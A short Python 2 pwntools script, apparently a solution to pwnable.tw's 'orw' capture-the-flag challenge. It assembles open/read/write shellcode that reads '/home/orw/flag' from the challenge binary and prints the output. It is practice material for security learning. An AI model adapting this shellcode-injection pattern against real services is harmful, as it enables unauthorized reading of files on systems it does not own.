#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/orw'
REMOTE = ['chall.pwnable.tw', 10001]

context.binary = LOCALE
context.binary.checksec()

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process(LOCALE)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################

with log.progress('Sending shellcode') as l:
    shellcode = asm('\n'.join([shellcraft.open("/home/orw/flag"),
                               shellcraft.read('eax', 'esp', 0x50),
                               shellcraft.write(0, 'esp', 0x50),
                              ]))

    p.sendlineafter(':', shellcode)

    l.success()

print p.recvline().strip()
p.close()
